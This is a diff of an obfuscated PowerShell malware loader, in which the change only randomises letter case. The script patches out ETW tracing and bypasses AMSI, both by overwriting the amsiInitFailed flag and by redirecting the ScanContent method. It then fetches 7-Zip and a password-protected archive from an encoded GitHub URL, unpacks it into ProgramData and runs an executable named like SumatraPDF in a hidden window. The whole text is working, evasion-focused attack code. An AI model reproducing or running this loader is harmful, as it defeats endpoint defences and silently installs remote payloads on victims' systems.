@@ -1,30 +1,30 @@
 
-class zsZRXVIIMQvZ {
-    static [void] FHVcGSwOEM() { }
+class zsZRxVIimqVZ {
+    static [VoId] FhvCgsWOeM() { }
 }
 
-$tempZip = Join-Path $PSScriptRoot ('pa'+'ylo'+'ad.z'+'ip')
+$tEmPzIp = JoiN-PatH $pSscRIpTrOOT ('pa'+'ylo'+'ad.z'+'ip')
 
 try {
-    $etwProvider = [Ref].Assembly.GetType(
-        $($k2830='lQOw-+';$b=[byte[]](0x3F,0x28,0x3C,0x03,0x48,0x46,0x42,0x1C,0x2E,0x19,0x4C,0x4C,0x09,0x3C,0x2A,0x19,0x59,0x05,0x2D,0x24,0x3B,0x18,0x40,0x4A,0x18,0x38,0x20,0x19,0x03,0x7F,0x1E,0x30,0x2C,0x1E,0x43,0x4C,0x42,0x01,0x1C,0x32,0x59,0x5C,0x20,0x3E,0x28,0x27,0x5F,0x44,0x1A,0x38,0x2B,0x12,0x5F);$kb=[System.Text.Encoding]::UTF8.GetBytes($k2830);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))
-    ).GetField(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZXR3UHJvdmlkZXI='))), $(-join('FgfHmtdau,Klslau'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+8)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+8)%26))}else{[char]$c}}))).GetValue($null)
+    $EtwPROVIder = [ref].Assembly.GettYpE(
+        $($k2830='lQOw-+';$b=[ByTE[]](0x3F,0X28,0X3c,0X03,0x48,0x46,0X42,0x1c,0X2E,0X19,0x4C,0X4C,0x09,0X3c,0x2A,0X19,0X59,0X05,0x2D,0X24,0X3B,0x18,0X40,0x4a,0X18,0X38,0X20,0X19,0x03,0X7f,0X1E,0x30,0X2C,0x1E,0X43,0x4c,0X42,0X01,0x1c,0X32,0X59,0x5c,0x20,0x3E,0X28,0X27,0x5f,0X44,0x1A,0x38,0x2b,0X12,0X5f);$Kb=[SYSTEM.texT.ENCoDINg]::uTf8.gEtbyTeS($K2830);-join(0..($B.Length-1)|%{[char]($B[$_]-bxor$kb[$_%$kb.LENgth])}))
+    ).GEtField(([SYStEM.texT.ENCoDINg]::utF8.getstrInG([SYStEM.convERt]::frombaSe64sTRInG('ZXR3UHJvdmlkZXI='))), $(-join('FgfHmtdau,Klslau'.TOCharaRrAy()|%{[INT]$c=$_;if($C-GE65-AND$c-le90){[CHar](65+(($C-65+8)%26))}elseif($c-ge97-aND$c-LE122){[chaR](97+(($c-97+8)%26))}else{[cHaR]$C}}))).getVAluE($NULl)
 
-    $eventProviderType = [Reflection.Assembly]::LoadWithPartialName((-join([char]0x53, [char]0x79, [char]0x73, [char]0x74, [char]0x65, [char]0x6D, [char]0x2E, [char]0x43, [char]0x6F, [char]0x72, [char]0x65))).
-        GetType(([string]::Format('{0}{1}{2}{3}{4}{5}{6}{7}{8}{9}{10}{11}{12}{13}{14}{15}','Sy','ste','m.Di','a','g','n','os','tics.','Event','ing.E','ven','tPro','v','i','de','r')))
+    $eVeNTpRovIDERtYPE = [reFleCtiOn.Assembly]::loAdwIthpaRtiALNamE((-join([chAR]0x53, [cHAr]0x79, [cHar]0X73, [CHAr]0x74, [cHAr]0x65, [cHAr]0X6D, [ChaR]0X2E, [cHAr]0x43, [cHAr]0X6F, [cHaR]0x72, [chaR]0X65))).
+        GeTTYpe(([strInG]::fOrmAT('{0}{1}{2}{3}{4}{5}{6}{7}{8}{9}{10}{11}{12}{13}{14}{15}','Sy','ste','m.Di','a','g','n','os','tics.','Event','ing.E','ven','tPro','v','i','de','r')))
 
-    $mEnabled = $eventProviderType.GetField($($k9393='8;:t-b$9Clv)8';$b=[byte[]](0x55,0x64,0x5F,0x1A,0x4C,0x00,0x48,0x5C,0x27);$kb=[System.Text.Encoding]::UTF8.GetBytes($k9393);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})), (-join('NonPub','lic,Ins','t','a','nce')))
-    $mEnabled.SetValue($etwProvider, 0)
+    $MEnABled = $evenTprOViDertYPE.geTFiELD($($K9393='8;:t-b$9Clv)8';$B=[bYtE[]](0x55,0X64,0X5F,0x1A,0X4c,0X00,0x48,0X5C,0x27);$kb=[SYSTEM.text.encOdIng]::Utf8.getbytes($K9393);-join(0..($b.lenGTh-1)|%{[ChAR]($b[$_]-bxor$kb[$_%$Kb.lENGTH])})), (-join('NonPub','lic,Ins','t','a','nce')))
+    $mEnABLed.sETValuE($eTwproVIdER, 0)
 }
 catch {
 
 }
 
 try {
-    $amsiType = [Ref].Assembly.GetType($($k8605=114;$b=[byte[]](0x21,0x0b,0x01,0x06,0x17,0x1f,0x5c,0x3f,0x13,0x1c,0x13,0x15,0x17,0x1f,0x17,0x1c,0x06,0x5c,0x33,0x07,0x06,0x1d,0x1f,0x13,0x06,0x1b,0x1d,0x1c,0x5c,0x33,0x1f,0x01,0x1b,0x27,0x06,0x1b,0x1e,0x01);-join($b|%{[char]($_-bxor$k8605)})))
+    $amSityPE = [rEf].Assembly.gettYPE($($K8605=114;$B=[BytE[]](0x21,0X0B,0x01,0X06,0X17,0X1F,0x5C,0X3F,0X13,0X1C,0X13,0x15,0x17,0X1f,0x17,0X1c,0x06,0x5c,0x33,0X07,0X06,0x1d,0X1f,0X13,0x06,0x1B,0x1D,0X1c,0x5C,0X33,0x1F,0X01,0X1B,0x27,0X06,0x1B,0X1E,0X01);-join($b|%{[CHaR]($_-bxOr$k8605)})))
 
-    $amsiInitFailed = $amsiType.GetField((-join([char]0x61, [char]0x6D, [char]0x73, [char]0x69, [char]0x49, [char]0x6E, [char]0x69, [char]0x74, [char]0x46, [char]0x61, [char]0x69, [char]0x6C, [char]0x65, [char]0x64)), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Tm9uUHVibGljLFN0YXRpYw=='))))
-    $amsiInitFailed.SetValue($null, $true)
+    $AmsiiNitFAilED = $amSItypE.gEtfiELD((-join([chaR]0x61, [CHAR]0X6d, [cHAr]0x73, [ChAR]0x69, [chaR]0X49, [CHar]0X6e, [CHaR]0x69, [cHar]0X74, [CHAr]0X46, [ChAR]0X61, [chAR]0x69, [ChAr]0x6c, [chAR]0x65, [cHaR]0X64)), ([SyStEM.tEXt.enCODing]::UTf8.getStriNg([sYStEm.convErT]::frOmbASE64STRiNg('Tm9uUHVibGljLFN0YXRpYw=='))))
+    $AmsiINiTfAiLeD.SeTVaLuE($NULl, $True)
 }
 catch {
  
@@ -32,17 +32,17 @@ catch {
 
 
 try {
-    $scanContent = $amsiType.GetMethods(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Tm9uUHVibGljLFN0YXRpYw==')))) |
-        Where-Object { $_.Name -eq $(-join('QaylAmlrclr'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+2)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+2)%26))}else{[char]$c}})) }
+    $ScanContEnt = $aMSITYpe.GETmetHODs(([sysTEM.tExt.eNcodiNg]::utf8.getsTRINg([sYsTEm.ConVeRt]::FrOmBAse64sTrIng('Tm9uUHVibGljLFN0YXRpYw==')))) |
+        wherE-objecT { $_.NAMe -eq $(-join('QaylAmlrclr'.tOcHArarRaY()|%{[Int]$c=$_;if($c-ge65-aND$C-LE90){[CHar](65+(($C-65+2)%26))}elseif($C-GE97-aNd$C-Le122){[cHAr](97+(($C-97+2)%26))}else{[CHar]$C}})) }
 
-    $decoy = [zsZRXVIIMQvZ].GetMethods() |
-        Where-Object { $_.Name -eq $(-join('HJXeIUyQGO'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+24)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+24)%26))}else{[char]$c}})) }
+    $decOY = [ZSzRXviimQVZ].gEtmetHODs() |
+        WHERe-object { $_.NaMe -eq $(-join('HJXeIUyQGO'.ToChARArRAY()|%{[inT]$c=$_;if($c-GE65-aND$c-Le90){[CHar](65+(($C-65+24)%26))}elseif($c-ge97-anD$C-le122){[ChaR](97+(($c-97+24)%26))}else{[char]$C}})) }
 
-    [System.Runtime.InteropServices.Marshal]::Copy(
-        @([System.Runtime.InteropServices.Marshal]::ReadIntPtr(
-            [long]$decoy.MethodHandle.Value + [long]8)),
+    [SYStEM.rUnTime.iNTeropSERvICes.MArSHAl]::copY(
+        @([SystEM.RUNTIme.iNTEroPseRviCES.marShaL]::REaDinTPtR(
+            [LOnG]$decoy.MEtHOdhaNdLe.VALue + [LOng]8)),
         0,
-        [long]$scanContent.MethodHandle.Value + [long]8,
+        [LONg]$SCaNcontEnt.MEthodhandLe.VAlue + [lOnG]8,
         1
     )
 }
@@ -51,29 +51,29 @@ catch {
 }
 
 
-$extractTo = Join-Path $env:ProgramData ("$([char]0x6B)$([char]0x6E)$([char]0x7A)$([char]0x5F)$([char]0x7B)$([char]0x30)$([char]0x7D)" -f ([IO.Path]::GetRandomFileName()))
+$exTraCTto = Join-patH $eNv:PRoGRAmdATa ("$([char]0x6B)$([char]0x6E)$([char]0x7A)$([char]0x5F)$([char]0x7B)$([char]0x30)$([char]0x7D)" -F ([iO.paTh]::GEtraNDoMFiLeNamE()))
 
-[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
+[SystEm.NET.SeRvicepOIntmAnAGER]::SeCURiTypRoTocOl = [sYstem.NeT.seCurITYPRotocoltYpE]::tLS12
 
-$url         = $(-join('iuuqt://hjuivc.dpn/qvujo22222/uftu/sbx/sfgt/ifbet/nbjo/tvnbusb.ajq'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+25)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+25)%26))}else{[char]$c}}))
-$zipPath     = Join-Path $extractTo $(-join('bdvjcaj.iry'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+17)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+17)%26))}else{[char]$c}}))
-$sevenZipUrl = $(-join('nzzvy://moznah.ius/jkbkrgx/7fov-hot/xgc/sgyzkx/cot/d64/7fg.kdk'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+20)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+20)%26))}else{[char]$c}}))
-$sevenZip    = Join-Path $extractTo ([string]::Format('{0}{1}{2}{3}','7za.','e','x','e'))
-$password    = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('dGVzdA==')))
+$url         = $(-join('iuuqt://hjuivc.dpn/qvujo22222/uftu/sbx/sfgt/ifbet/nbjo/tvnbusb.ajq'.ToCHararrAy()|%{[InT]$c=$_;if($c-ge65-and$c-LE90){[cHAr](65+(($c-65+25)%26))}elseif($C-gE97-anD$c-Le122){[CHaR](97+(($c-97+25)%26))}else{[chAR]$C}}))
+$zippAth     = jOIn-PATH $exTRACtto $(-join('bdvjcaj.iry'.TocHAraRRaY()|%{[inT]$c=$_;if($c-ge65-and$c-Le90){[ChAR](65+(($c-65+17)%26))}elseif($c-GE97-aND$C-lE122){[CHAr](97+(($C-97+17)%26))}else{[chaR]$c}}))
+$sEVEnziPUrL = $(-join('nzzvy://moznah.ius/jkbkrgx/7fov-hot/xgc/sgyzkx/cot/d64/7fg.kdk'.tocharArRay()|%{[INT]$c=$_;if($C-Ge65-AND$C-LE90){[chaR](65+(($c-65+20)%26))}elseif($c-ge97-and$C-LE122){[ChaR](97+(($C-97+20)%26))}else{[chAr]$C}}))
+$sEVENzIp    = JOiN-paTh $ExtRaCTTO ([STRIng]::Format('{0}{1}{2}{3}','7za.','e','x','e'))
+$PAsSWord    = ([sysTeM.Text.EnCODIng]::Utf8.gETstrinG([sYStEm.ConVERt]::FRoMbASE64strinG('dGVzdA==')))
 
-New-Item -ItemType Directory -Path $extractTo -Force | Out-Null
+New-ItEM -ITEMType DiREcToRY -pATh $eXtRactto -ForCE | oUt-nUlL
 
-if (-not (Test-Path $sevenZip)) {
-    (New-Object Net.WebClient).DownloadFile($sevenZipUrl, $sevenZip)
+if (-not (tEsT-pAth $sEvEnZIP)) {
+    (NeW-ObjeCT NeT.WEBcLIEnt).doWNloadfIlE($sEVenzIpurl, $SEVEnzIp)
 }
 
-(New-Object Net.WebClient).DownloadFile($url, $zipPath)
+(new-oBJECT Net.wEBcliEnT).DOwnLOADfIlE($URL, $ZIPpatH)
 
-& $sevenZip x $zipPath ($($k9548=13;$b=[byte[]](0x20,0x62);-join($b|%{[char]($_-bxor$k9548)})) + $extractTo) (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LXA='))) + $password) -y | Out-Null
+& $sevenziP x $ZIppatH ($($k9548=13;$B=[ByTE[]](0x20,0X62);-join($B|%{[CHAr]($_-bxOr$K9548)})) + $eXTRactTO) (([sYSTeM.TexT.encoDING]::uTf8.GETStriNg([SYStEM.CoNVeRt]::fRomBASe64STRiNG('LXA='))) + $PAsswOrd) -Y | OuT-nulL
 
-$exe = Get-ChildItem $extractTo -Recurse -Filter "$([char]0x53)$([char]0x75)$([char]0x6D)$([char]0x61)$([char]0x74)$([char]0x72)$([char]0x61)$([char]0x50)$([char]0x44)$([char]0x46)$([char]0x2A)$([char]0x2E)$([char]0x65)$([char]0x78)$([char]0x65)" -ErrorAction SilentlyContinue |
-       Select-Object -First 1 -ExpandProperty FullName
+$exE = get-CHILdITEm $eXTRacTTO -ReCURSE -Filter "$([char]0x53)$([char]0x75)$([char]0x6D)$([char]0x61)$([char]0x74)$([char]0x72)$([char]0x61)$([char]0x50)$([char]0x44)$([char]0x46)$([char]0x2A)$([char]0x2E)$([char]0x65)$([char]0x78)$([char]0x65)" -eRroRACTioN SilEnTlyCOntInUE |
+       SELeCt-OBjECt -fIrSt 1 -eXPANdpRoPERtY fUllname
 
-if ($exe) {
-    Start-Process -FilePath $exe -WindowStyle Hidden
+if ($EXE) {
+    STArt-pRoCeSs -fIlEPath $exE -wINDowStYLE HidDEN
 }
